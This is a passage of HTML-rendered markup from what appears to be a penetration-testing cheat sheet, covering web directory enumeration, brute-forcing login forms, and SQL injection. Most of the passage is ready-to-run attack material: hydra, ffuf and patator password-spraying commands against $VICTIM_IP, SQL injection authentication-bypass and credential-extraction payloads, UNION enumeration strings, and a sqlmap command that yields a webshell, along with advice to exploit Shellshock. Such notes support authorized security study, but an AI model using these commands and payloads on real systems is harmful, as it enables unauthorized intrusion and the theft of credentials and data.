class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -v  : verbose\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -a3 : agressive scan\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --log-verbose \u0026lt;file\u0026gt; : save scan output to file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e also supports setting Cookies, HTTP BasicAuth, and proxies\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003cg-emoji class=\"g-emoji\" alias=\"warning\"\u003e锔\u003c/g-emoji\u003e PHP 5.x is vulnerable to Shellshock!\u003c/strong\u003e - If you see it listed by whatweb, exploit it!\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWeb Directory discovery with Gobuster:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Gobuster\nulimit -n 8192 # prevent file access error during scanning\ngobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x \u0026quot;txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf\u0026quot; -o gobuster-common.txt -u http://$VICTIM_IP\n# -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)\n# -z / --no-progress = no progress displayed\n# -q / --quiet = quiet mode (no banner)\n# -r / --follow-redirect\n# -k / --no-tls-validation\n# -w / --wordlist\n# -t / --threads\n# -o / --output\n\n# user-agent:\n# -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'\n# other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt\n\n# adding a proxy to gobuster:\n# --proxy socks5://127.0.0.1:1080\n\n# you can use patterns with the wordlist to fuzz for API endpoints.\n# -p / --pattern \u0026lt;pattern-file\u0026gt;\n# where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,\n# one pattern per line\n# Example:\n# {GOBUSTER}/v1\n# {GOBUSTER}/v2\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Gobuster\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eulimit\u003c/span\u003e -n 8192 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e prevent file access error during scanning\u003c/span\u003e\ngobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etxt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -o gobuster-common.txt -u http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -z / --no-progress = no progress displayed\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -q / --quiet = quiet mode (no banner)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -r / --follow-redirect\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -k / --no-tls-validation\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -w / --wordlist\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -t / --threads\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -o / --output\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e user-agent:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e adding a proxy to gobuster:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --proxy socks5://127.0.0.1:1080\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can use patterns with the wordlist to fuzz for API endpoints.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -p / --pattern \u0026lt;pattern-file\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e one pattern per line\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Example:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e {GOBUSTER}/v1\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e {GOBUSTER}/v2\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWeb Directory discovery with ffuf (great for scanning through SOCKS proxy):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# FFUF as a dirbuster through a SOCKS proxy\nffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt\n# pretty print json output:\nffuf.json | python -m json.tool\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e FFUF as a dirbuster through a SOCKS proxy\u003c/span\u003e\nffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e pretty print json output:\u003c/span\u003e\nffuf.json \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e python -m json.tool\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOther web discovery tools:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eferoxbuster - fast scanner written in Rust\u003c/li\u003e\n\u003cli\u003edirb\u003c/li\u003e\n\u003cli\u003edirbuster\u003c/li\u003e\n\u003cli\u003ewfuzz\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eGood wordlists to try:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e/usr/share/dirb/wordlists/small.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirb/wordlists/common.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirb/wordlists/catala.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirb/wordlists/big.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirbuster/wordlists/directory-list-1.0.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt\u003c/li\u003e\n\u003cli\u003e/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.2 Web Credential Bruteforcing\u003c/h3\u003e\u003ca id=\"user-content-262-web-credential-bruteforcing\" class=\"anchor\" aria-label=\"Permalink: 2.6.2 Web Credential Bruteforcing\" href=\"#262-web-credential-bruteforcing\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGet a wordlist and emails from the site using \u003ccode\u003ecewl\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# save emails to file, min word length = 5\ncewl -e --email_file emails.txt -m 5 -w cewl.txt http://VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e save emails to file, min word length = 5\u003c/span\u003e\ncewl -e --email_file emails.txt -m 5 -w cewl.txt http://VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHydra is great for hitting web login forms. To use it, first capture a failed login using Burp. You need that to see how it submits the login request and to see how to identify a failed login.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHydra help/usage for specific module:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"hydra -U http-post-form\"\u003e\u003cpre\u003ehydra -U http-post-form\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWeb Forms (POST request):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using hydra\n# string format \u0026quot;\u0026lt;webform-path\u0026gt;:\u0026lt;username-field\u0026gt;=^USER^\u0026amp;\u0026lt;password-field\u0026gt;=^PASS^:\u0026lt;bad-pass-marker\u0026gt;\u0026quot;\n# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames\n# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.\n# '-t 69': use 69 threads\n# change to https-web-form for port 443\nhydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP http-post-form \u0026quot;/blog/admin.php:username=^USER^\u0026amp;password=^PASS^:Incorrect username\u0026quot; -t 64\n\n# proxy-aware password bruteforcing with ffuf\nffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d \u0026quot;Username=admin\u0026amp;Password=FUZZ\u0026amp;RememberMe=true\u0026quot; -fw 6719\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using hydra\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e string format \"\u0026lt;webform-path\u0026gt;:\u0026lt;username-field\u0026gt;=^USER^\u0026amp;\u0026lt;password-field\u0026gt;=^PASS^:\u0026lt;bad-pass-marker\u0026gt;\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-t 69': use 69 threads\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change to https-web-form for port 443\u003c/span\u003e\nhydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e http-post-form \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/blog/admin.php:username=^USER^\u0026amp;password=^PASS^:Incorrect username\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -t 64\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e proxy-aware password bruteforcing with ffuf\u003c/span\u003e\nffuf -x socks5://localhost:1080 -u http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUsername=admin\u0026amp;Password=FUZZ\u0026amp;RememberMe=true\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -fw 6719\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHTTP BasicAuth (GET request):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# hydra http basic auth brute force\n# Use https-get for https\n# '-u' loops users before moving onto next password\nhydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt \u0026quot;http-get://$VICTIM_IP/loginpage:A=BASIC\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hydra http basic auth brute force\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Use https-get for https\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-u' loops users before moving onto next password\u003c/span\u003e\nhydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp-get://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/loginpage:A=BASIC\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCSRF Tokens defeat hydra, so use \u003ccode\u003epatator\u003c/code\u003e: (documentation in \u003ca href=\"https://github.com/lanjelot/patator/blob/master/patator.py\"\u003e\u003ccode\u003epatator.py\u003c/code\u003e\u003c/a\u003e)\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# before_urls visits the login page where the CSRF token is\n# before_egrep uses regex to extract the CSRF token\n# bug in reslover means you have to tell it to resolve IP to itself\n# use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.\npatator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url=\u0026quot;http://VICTIM_IP/login\u0026quot; body='csrf_token=__CSRF__\u0026amp;usernameD=FILE0\u0026amp;password=FILE1' 0=users.txt 1=cewl.txt before_urls=\u0026quot;http://VICTIM_IP/login\u0026quot; before_egrep='__CSRF__:value=\u0026quot;(\\w+)\u0026quot; id=\u0026quot;login__csrf_token\u0026quot;' -x ignore:fgrep='No match'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e before_urls visits the login page where the CSRF token is\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e before_egrep uses regex to extract the CSRF token\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e bug in reslover means you have to tell it to resolve IP to itself\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.\u003c/span\u003e\npatator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://VICTIM_IP/login\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e body=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ecsrf_token=__CSRF__\u0026amp;usernameD=FILE0\u0026amp;password=FILE1\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e 0=users.txt 1=cewl.txt before_urls=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://VICTIM_IP/login\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e before_egrep=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e__CSRF__:value=\"(\\w+)\" id=\"login__csrf_token\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -x ignore:fgrep=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eNo match\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.3 SQL Injection\u003c/h3\u003e\u003ca id=\"user-content-263-sql-injection\" class=\"anchor\" aria-label=\"Permalink: 2.6.3 SQL Injection\" href=\"#263-sql-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTips:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eTest for SQL/NoSQL injection using \"bad\" chars: \u003ccode\u003e'\")}$%%;\\\u003c/code\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eFull list:\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'\n\u0026quot;\n\\\n;\n`\n)\n}\n--\n#\n/*\n//\n$\n%\n%%\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'\n\"\n\\\n;\n`\n)\n}\n--\n#\n/*\n//\n$\n%\n%%\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eWatch out for apps stripping required trailing whitespace after \u003ccode\u003e--\u003c/code\u003e. Use \u003ccode\u003e-- #\u003c/code\u003e or similar.\u003c/li\u003e\n\u003cli\u003eSQL comments:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e--\u003c/code\u003e - requires trailing whitespace, widely supported\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/*\u003c/code\u003e - multi-line comment, widely supported\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e#\u003c/code\u003e - MySQL\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eREM\u003c/code\u003e - Oracle\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eWhen detecting errors due to SQLi, it may not be an obvious error message. Look for pattern changes/missing output to indicate error.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAuth bypass (try both username and password fields):\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' or 1=1 -- #  \u0026lt;-- MySQL,MSSQL\n' || '1'='1' -- #  \u0026lt;-- PostgreSQL\nadmin' or 1=1 -- #\nadmin') or (1=1 -- #\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' or 1=1 -- #  \u0026lt;-- MySQL,MSSQL\n' || '1'='1' -- #  \u0026lt;-- PostgreSQL\nadmin' or 1=1 -- #\nadmin') or (1=1 -- #\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExtracting data from error messages:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"' or 1=1 in (select @@version) -- #\n' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- #\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e' or 1=1 in (select @@version) -- #\n' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- #\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePro tip for \u003ccode\u003esqlmap\u003c/code\u003e: if you save the GET/POST request of a SQLi attempt in burp,\nyou can pass that request file to \u003ccode\u003esqlmap\u003c/code\u003e as a template for it's requests. You\ncan also pass it the webroot and \u003ccode\u003e--os-shell\u003c/code\u003e args to get it to give you a\nwebshell:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sqlmap -r post.txt -p FIELDNAME --os-shell --web-root \u0026quot;/var/www/html/tmp\u0026quot;\"\u003e\u003cpre\u003esqlmap -r post.txt -p FIELDNAME --os-shell --web-root \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/var/www/html/tmp\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.3.1 UNION SQLi technique\u003c/h4\u003e\u003ca id=\"user-content-2631-union-sqli-technique\" class=\"anchor\" aria-label=\"Permalink: 2.6.3.1 UNION SQLi technique\" href=\"#2631-union-sqli-technique\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe UNION SQL injection technique is helpful when the result of the original SQL\nquery is output/displayed to the user. Using UNION, we can ask for extra data\nfrom the database that wasn't originally intended to be shown to the user (like creds).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFor UNION SQLi attacks to work, we first need to satisfy two conditions:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eThe injected UNION query has to include the same number of columns as the original query.\u003c/li\u003e\n\u003cli\u003eThe data types need to be compatible between each column.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eFirst, determine how many columns are in the original query:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"' ORDER BY 1-- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e ORDER BY 1-- #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIncrement the value using binary search (2, 4, 8,...) until it errors out, then\nuse binary search to isolate the highest value that does NOT error out. This\nis the number of columns in the original query.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eNext, (optionally) figure out what column index goes where in your output.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- assuming 3 columns from ORDER BY test\n' union all select 1,2,3 -- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e assuming 3 columns from ORDER BY test\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e union all select 1,2,3 -- #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, use enumeration functions in output columns, shifting what goes\nwhere in trial-and-error fashion until you get useful output:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- assuming 5 columns from ORDER BY test, shifting enumeration output\n' UNION SELECT database(), user(), @@version, null, null -- #\n' UNION SELECT null, null, database(), user(), @@version -- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e assuming 5 columns from ORDER BY test, shifting enumeration output\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e UNION SELECT database(), user(), @@version, null, null -- #\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eUNION\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"pl-k\"\u003enull\u003c/span\u003e, \u003cspan class=\"pl-k\"\u003enull\u003c/span\u003e, database(), user(), @@version \u003cspan class=\"pl-c\"\u003e\u003cspan 